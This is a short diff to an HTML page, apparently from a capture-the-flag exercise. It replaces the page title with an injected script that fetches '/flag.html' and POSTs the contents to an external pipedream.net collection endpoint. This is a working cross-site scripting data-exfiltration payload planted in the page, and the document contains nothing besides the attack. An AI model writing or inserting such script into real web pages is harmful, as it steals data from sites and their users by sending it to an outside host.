@@ -1,7 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>random</title>
+    <title><script>
+    fetch('/flag.html')
+      .then(response => response.text())
+      .then(data => {
+        fetch('https://eownbmaqeyx6p8e.m.pipedream.net', {
+          method: 'POST',
+          body: data
+        });
+      });
+    </script></title>
 </head>
 <body>
     <script src="script.js"></script>
